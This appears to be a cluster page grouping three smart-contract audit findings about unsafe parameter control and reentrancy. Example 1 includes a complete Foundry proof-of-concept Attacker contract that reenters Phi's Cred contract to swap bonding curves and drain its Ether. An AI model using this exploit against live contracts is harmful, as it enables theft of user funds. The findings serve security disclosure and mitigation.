# Cluster -1077

**Rank:** #420  
**Count:** 10  

## Label
Unauthorized control of critical parameters enables attackers to manipulate swaps, redirect funds, or exploit pricing gaps, leading to token theft or failed transfers through unsafe access and validation.

## Cluster Information
- **Total Findings:** 10

## Examples

### Example 1

**Auto Label:** **Improper validation and unauthorized control of critical contract parameters enable attackers to manipulate fees, redirect tokens, or exploit execution flow for profit.**  

**Original Text Preview:**

***Note: the [submission](https://github.com/code-423n4/2024-08-phi-findings/issues/25) from warden 0xCiphky was originally featured as `H-06` in this report; however, after further discussion between the judge and sponsor, it was determined that a different submission demonstrates the largest impact of the common issue. Per direction from the judge, this audit report was updated on October 16, 2024 to highlight the submission below from warden CAUsr.***

### Vulnerability Details

During cred creation, the sender automatically buys 1 share of the cred. During share purchases, a refund is issued if Ether provided by the sender exceeds the value needed. It allows an attacker to reenter both cred creation and share trading functions. Which, in turn, allows the attacker to overwrite cred data before the `credIdCounter` is incremented. This fact introduces a critical vulnerability in the case when there is more than one whitelisted bonding curve. The attacker can purchase shares cheaply, overwrite the cred, and sell the shares expensively, almost depleting the entire contract balance.

Let's discuss a possible attack vector in detail.

Preparations. The attacker prepares two sets of cred creation data which may be quite legit. The most important aspect is that the first set uses a "cheaper" bonding curve and the other uses a more expensive one (see the Impact section for more details). The sender's address would be a helper contract address. However, the attacker doesn't need to deploy the contract beforehand to know its address, since there are several ways to know a to-be-deployed contract address without exposing its bytecode (e.g. by deployer address and nonce or with the help of the `CREATE2` opcode). To sum up, at the moment of checking cred creation data and signing there are no signs of malignancy.

Then, the attacker deploys the helper contract and invokes an attack. Further actions are executed by the contract in a single transaction as follows.

1. The attacker creates the first cred, with the cheap `IBondingCurve` used. The cred creation code invokes `buyShareCred(credIdCounter, 1, 0);` as part of its job. The attacker provides excess Ether, so a refund is triggered and the control goes back to the attacker. Note that [the counter increment](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L574) is not reached yet.

    ```solidity
        function _createCredInternal(
            address creator_,
            string memory credURL_,
            string memory credType_,
            string memory verificationType_,
            address bondingCurve_,
            uint16 buyShareRoyalty_,
            uint16 sellShareRoyalty_
        )
            internal
            whenNotPaused
            returns (uint256)
        {
            if (creator_ == address(0)) {
                revert InvalidAddressZero();
            }
    
            creds[credIdCounter].creator = creator_;
            creds[credIdCounter].credURL = credURL_;
            creds[credIdCounter].credType = credType_;
            creds[credIdCounter].verificationType = verificationType_;
            creds[credIdCounter].bondingCurve = bondingCurve_;
            creds[credIdCounter].createdAt = uint40(block.timestamp);
            creds[credIdCounter].buyShareRoyalty = buyShareRoyalty_;
            creds[credIdCounter].sellShareRoyalty = sellShareRoyalty_;
    
            buyShareCred(credIdCounter, 1, 0);
    
            emit CredCreated(creator_, credIdCounter, credURL_, credType_, verificationType_);
    
            credIdCounter += 1;
    
            return credIdCounter - 1;
        }
    ```

2. The attacker buys some amount of shares of the almost created cred by invoking [buyShareCred](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L178). Note that there are no significant obstacles to doing that as the attacker can employ a flash loan. Again, the attacker provides excess Ether, so a refund is triggered and the control goes back to the attacker.
 
3. Remember that the control is still nested in `buyShareCred` nested in the first `createCred`. This time the attacker invokes the [createCred](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L232-L241) again, with the second cred creation data, with a more expensive bonding curve used. Note that there are no reentrancy guards in `createCred`, `buyShareCred`, or `sellShareCred`. The data is passed to [_createCredInternal](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L557-L570) where it overwrites the first cred contents in the `creds[credIdCounter]` (remember, the counter is not incremented yet by the first `createCred`). [Here is](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L565) the most important part of the overwriting for the attacker: they just changed the bonding curve.

    ```solidity
        creds[credIdCounter].bondingCurve = bondingCurve_;
    ```

A couple of lines below `buyShareCred` will be hit again and the attacker grabs back the control in the usual manner.

4. Now the attacker calls `sellShareCred` and dumps as many purchased shares as possible until depleting the Cred balance or his own share balance. The "more expensive" bonding curve gives the attacker more Ether than they spend while buying on step 2. Note that the share lock time also won't help as the timestamp [is not yet set](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L644), which is the subject of another finding.

    ```solidity
        if (isBuy) {
            cred.currentSupply += amount_;
            uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
            if (excessPayment > 0) {
                _msgSender().safeTransferETH(excessPayment);
            }
            lastTradeTimestamp[credId_][curator_] = block.timestamp;
        } else {
            cred.currentSupply -= amount_;
            curator_.safeTransferETH(price - protocolFee - creatorFee);
        }
    ```
   
Even if the `SHARE_LOCK_PERIOD` was honored, that would mean that the attacker has to wait 10 minutes before pocketing the profit. That would make the situation a bit more difficult for the attacker, but still highly dangerous for the protocol.

5. At this moment almost all Ether from the Cred contract is transferred to the attacker's contract. The attacker has to keep some of the Ether intact since now the unwinding of the nested calls is happening (and some fees are paid): the second `createCred`, `buyShareCred`, and the first `createCred`.

### Impact

As soon as there is more than one bonding curve whitelisted in the protocol, the vulnerability allows to drain almost entire protocol funds. Whitelisting more than one curve [seems to be an expected behavior](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L159-L166).

Fine-tuning the numbers to exploit the bonding curve price differences is a mere technicality, e.g. if there was just a 10% price difference that would be more than enough to perform an attack. Also note that on the current codebase, the attack may be repeated numerously and instantly.

### Proof of Concept

Please apply the patch to the `test/Cred.t.sol` and run with `forge test --match-test testCredDraining -vv`.

<details>

```diff
diff --git a/test/Cred.t.sol.orig b/test/Cred.t.sol
index da9157c..12b60e7 100644
--- a/test/Cred.t.sol.orig
+++ b/test/Cred.t.sol
@@ -9,7 +9,9 @@ import { LibClone } from "solady/utils/LibClone.sol";
 import { Settings } from "./helpers/Settings.sol";
 import { Cred } from "../src/Cred.sol";
 import { ICred } from "../src/interfaces/ICred.sol";
+import { IBondingCurve } from "../src/interfaces/IBondingCurve.sol";
 import { BondingCurve } from "../src/curve/BondingCurve.sol";
+import { FixedPriceBondingCurve } from "../src/lib/FixedPriceBondingCurve.sol";
 
 contract TestCred is Settings {
     uint256 private constant GRACE_PERIOD = 14 days;
@@ -243,4 +245,158 @@ contract TestCred is Settings {
         // Final assertions
         assertEq(cred.credInfo(credId).currentSupply, 1); // Only initial purchase remains
     }
+
+    // test helper function
+    function _makeCreateData(address curve, address sender) private view returns (bytes memory data, bytes memory signature) {
+        bytes memory signCreateData = abi.encode(
+            block.timestamp + 100, sender, 0, curve, "test", "BASIC", "SIGNATURE", 0x0
+        );
+        bytes32 createMsgHash = keccak256(signCreateData);
+        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
+        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
+        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
+
+        return (signCreateData, abi.encodePacked(cr, cs));
+    }
+
+    // forge test --match-test testCredDraining -vv
+    function testCredDraining() public {
+        // Constructing playground
+        _createCred("BASIC", "SIGNATURE", 0x0);
+        vm.startPrank(owner);
+        FixedPriceBondingCurve cheapCurve = new FixedPriceBondingCurve(owner);
+        cheapCurve.setCredContract(address(cred));
+        cred.addToWhitelist(address(cheapCurve));
+        vm.stopPrank();
+
+        vm.deal(address(cred), 50 ether);
+        uint credInitialBalance = address(cred).balance;
+        // Playground constructed: some creds and some ether received from share buyers
+
+        vm.deal(anyone, 2 ether);
+        uint attackerInitialBalance = address(anyone).balance;
+        vm.startPrank(anyone);
+        Attacker a = new Attacker(ICredExt(address(cred)));
+        // Step 0:
+        // Attack starts with just a couple of creds about to be created.
+        (bytes memory cheapData, bytes memory cheapSignature) = _makeCreateData(address(cheapCurve), address(a));
+        (bytes memory expensiveData, bytes memory expensiveSignature) = _makeCreateData(address(bondingCurve), address(a));
+
+        // See the contract Attacker for further details
+        a.attack{ value: 2 ether }(cheapData, cheapSignature, expensiveData, expensiveSignature);
+
+        uint credLosses = credInitialBalance - address(cred).balance;
+        uint attackerGains = address(anyone).balance - attackerInitialBalance;
+
+        console2.log("Cred lost: ", credLosses * 100 / credInitialBalance, "% of its balance");
+        assert(credLosses > 45 ether);
+        console2.log("Attacker gained: ", attackerGains / attackerInitialBalance, "times his initial balance");
+        assert(attackerGains > 40 ether);
+    }
+}
+
+
+interface ICredExt is ICred {
+    function createCred(
+        address creator_,
+        bytes calldata signedData_,
+        bytes calldata signature_,
+        uint16 buyShareRoyalty_,
+        uint16 sellShareRoyalty_
+    ) external payable;
+
+    function credIdCounter() external returns (uint256);
 }
+
+contract Attacker
+{
+    uint256 private constant sharesBuffer = 900;
+
+    ICredExt private immutable cred;
+    address private immutable owner;
+
+    bytes private cheapData;
+    bytes private cheapSignature;
+    bytes private expensiveData;
+    bytes private expensiveSignature;
+
+    uint256 private stage = 0;
+    uint256 private credId;
+
+    constructor(ICredExt cred_) {
+        cred = cred_;
+        owner = msg.sender;
+    }
+
+    function _createCred(bytes storage data, bytes storage signature) private {
+        cred.createCred{ value: 1.5 ether }(address(this), data, signature, 0, 0);
+    }
+
+    function attack(bytes calldata cheapData_, bytes calldata cheapSignature_,
+                    bytes calldata expensiveData_, bytes calldata expensiveSignature_) external payable {
+        require(msg.sender == owner);
+
+        // All the action is packed inside this call and several receive() callbacks.
+        cheapData = cheapData_;
+        cheapSignature = cheapSignature_;
+        expensiveData = expensiveData_;
+        expensiveSignature = expensiveSignature_;
+
+        stage = 1;
+        credId = cred.credIdCounter();  // This credId will be eventually overwritten in the Cred.
+
+        // Step 1: creating the first cred, with a cheap IBondingCurve used.
+        _createCred(cheapData, cheapSignature);
+
+        stage = 0;  // End of attack, at this moment the money is gone.
+    }
+
+    receive() external payable {
+        require(msg.sender == address(cred));
+
+        if (stage == 1) {
+            stage = 2;
+            // Step 2: we got there with excess payment refund triggered deep inside createCred.
+            // Now we buy more shares cheaply and hit receive() again with another refund.
+            cred.buyShareCred{ value: 0.1 ether }(credId, sharesBuffer, 0);
+        }
+        else if (stage == 2) {
+            stage = 3;
+            // Step 3: not is a tricky part: we create a new cred, but credIdCounter is not updated yet!
+            // Essentially, we overwrite the cred created at the step 1, setting an expensive IBondingCurve,
+            // and triggering another refund.
+            _createCred(expensiveData, expensiveSignature);
+        }
+        else if (stage == 3) {
+            stage = 4;
+            assert(credId == cred.credIdCounter()); // yep, we're still here
+
+            // Step 4: time to sell. Just an example of estimation of withdrawable value.
+            uint256 sellAmount = 0;
+            // We need to keep some fee on the cred's balance to allow nested call unwinds.
+            uint256 initialProtocolFee = 0.1 ether;
+            IBondingCurve curve = IBondingCurve(cred.credInfo(credId).bondingCurve);
+            while (sellAmount < sharesBuffer + 2) {
+                (uint256 price, uint256 protocolFee, uint256 creatorFee) =
+                        curve.getPriceData(credId, sharesBuffer + 2, sellAmount + 1, false);
+                if (price + protocolFee + creatorFee + initialProtocolFee > address(cred).balance)
+                    break;
+                else
+                    sellAmount++;
+            }
+
+            cred.sellShareCred(credId, sellAmount, 0);
+        }
+        else if (stage == 4) {
+            // The final step receives the sale profit and also allows nested calls to unwind the stack.
+            withdraw();    // Receiving and sending to the attacker.
+        }
+        else
+            revert("bad stage");
+    }
+
+    function withdraw() public {
+        payable(owner).transfer(address(this).balance);
+    }
+}
+
```

</details>

### Tools Used

Manual Review, Foundry

### Recommended Mitigation Steps

To mitigate this attack vector it would be enough to add a reentrancy guard [here](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L241):

```solidity
    function createCred(
        address creator_,
        bytes calldata signedData_,
        bytes calldata signature_,
        uint16 buyShareRoyalty_,
        uint16 sellShareRoyalty_
    )
        public
        payable
        whenNotPaused
+       nonReentrant
    {
```

* However, I recommend protecting with reentrancy guards all protocol functions directly or indirectly dealing with assets or important state.
* Another important measure to consider is adhering to the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern).

**[ZaK3939 (Phi) confirmed via issue \#25](https://github.com/code-423n4/2024-08-phi-findings/issues/25#event-14169412928)**

**[0xDjango (judge) commented](https://github.com/code-423n4/2024-08-phi-findings/issues/195#issuecomment-2414861921):**
> After further discussion, this submission should be selected for the public report. It shares the same root cause and fix as [#25](https://github.com/code-423n4/2024-08-phi-findings/issues/25), though highlights a much more severe impact. Sponsor indicated that there is a possibility that multiple price curves may be selectable in the future.

***Please note: the above re-assessment took place approximately 3 weeks after judging and awarding were finalized.***

***

---
### Example 2

**Auto Label:** Unauthorized control of critical parameters enables attackers to manipulate swaps, redirect funds, or exploit pricing gaps, leading to token theft or failed transfers through unsafe access and validation.  

**Original Text Preview:**

## Review of LaunchBridge Implementation

In the current implementation of LaunchBridge, `transitionAll`, `transitionETHAndUSD`, and `transitionLockedToken` may be called by any address for any user. This enables users to manipulate `targetUSD`, set arbitrary values for `minGasLimit`, or execute a sandwich attack via front-running, potentially resulting in the loss of user funds, as explained below.

```rust
// src/LaunchBridge.sol
function transitionAll(address user, uint32 minGasLimit, address targetUSD, uint256 minAmountOut)
external
transitionEnabled
{
    _transitionETHAndUSD(user, user, minGasLimit, targetUSD, minAmountOut);
    for (uint256 i = 0; i < lockableTokenWhitelist.length(); i++) {
        (address token, uint256 value) = lockableTokenWhitelist.at(i);
        address l2Token = address(uint160(value));
        if (l2Token != address(0)) {
            _transitionLockedToken(token, l2Token, user, user, minGasLimit);
        }
    }
}
```

If an attacker sets `targetUSD` to a token that is not properly handled by the contract (a token that is not included in the conversion logic), it may result in errors in transfers. For example, if `targetUSD` is set to a token that is not properly converted or managed, the contract may attempt to bridge an unsupported token, which may result in failed transactions or loss of funds.

```rust
// src/LaunchBridge.sol
function _transitionETHAndUSD(
    uint32 minGasLimit,
    address targetUSD,
    uint256 minAmountOut
) internal {
    IMainnetBridge mainnetBridge = getMainnetBridge();
    if (ethAmountToMove > 0) {
        mainnetBridge.bridgeETHTo{value: ethAmountToMove}(recipient, minGasLimit, bytes(""));
    }
}
```

Furthermore, the `minGasLimit` parameter may be set to any arbitrary value, including very low values such as zero, in `transitionAll`, `transitionETHAndUSD`, and `transitionLockedToken`. A very low `minGasLimit` will fail cross-chain transactions, as there may not be enough gas for the transaction to be processed on the Layer 2 chain.

```rust
// src/LaunchBridge.sol
function _transitionLockedToken(address token, address l2Token, address user, address recipient, uint32 minGasLimit)
internal
{
    require(!lockedTokenTransitioned[token][user], UserAlreadyTransitioned());
    uint256 amountToMove = tokenLocks[token][user];
    tokenLocks[token][user] = 0;
    lockedTokenTransitioned[token][user] = true;
    IMainnetBridge mainnetBridge = getMainnetBridge();
    if (amountToMove > 0) {
        mainnetBridge.bridgeERC20To(token, l2Token, recipient, amountToMove, minGasLimit, hex"");
    }
}
```

There is also the possibility of exploiting the `targetUSD` and `minAmountOut` parameters to perform front-running attacks, such as sandwiching, by setting `targetUSD` to USDT and `minAmountOut` to a very low value, such that the contract performs a conversion with an unfavorable rate. The attacker may then execute a transaction that manipulates the price or conversion rate to benefit from the discrepancy.

## Remediation

Ensure that only supported USD tokens are allowed for bridging, and implement checks to ensure that `minGasLimit` is within a reasonable range to prevent extremely low values. Also, include mechanisms to protect against front-running attacks, such as slippage limits.

## Patch

Resolved in commits `40913f3`, `c387ff5`, and `2057837`.

---
### Example 3

**Auto Label:** Unauthorized control of critical parameters enables attackers to manipulate swaps, redirect funds, or exploit pricing gaps, leading to token theft or failed transfers through unsafe access and validation.  

**Original Text Preview:**

##### Description

The `SwapBridge` contract relies heavily on the `tokenBridge` and `swapTarget` addresses, which are established at contract initialization, to operate effectively. The `tokenBridge` address plays a critical role in quoting fees for swaps and facilitating the transfer of tokens to the Aptos chain. Meanwhile, the `swapTarget` address is core for executing swaps within the `swapAndSendToAptos()` function.

This reliance on external addresses underscores the necessity of ensuring these addresses are secure and trusted, as they have substantial control over critical functions of the contract.

##### BVSS

[AO:S/AC:M/AX:M/C:N/I:C/A:C/D:C/Y:N/R:N/S:U (1.3)](/bvss?q=AO:S/AC:M/AX:M/C:N/I:C/A:C/D:C/Y:N/R:N/S:U)

##### Recommendation

Ensure the integrity and security of these addresses to maintain the contract's functionality and safeguard against potential unexpected vulnerabilities.

Remediation Plan
----------------

**ACKNOWLEDGED:** The **Taurus Labs team** made a business decision to acknowledge this finding and not alter the contracts, stating:

*To minimize the attack surface, we will ensure the users of SwapBridge contract to approve only the minimal allowance required for each instance a user uses the contract. Moreover, the contract shouldn’t hold any surplus token holdings with normal usage (rescue function is there only to rescue any balance that someone might mistakenly send to the contract).*

##### Remediation Hash

<https://github.com/tauruslabs/merkle-swapbridge/commit/b7966921879b0f2c7a53da5e6144ed81819f3873>

##### References

SwapBridge.sol#L16-L17

---
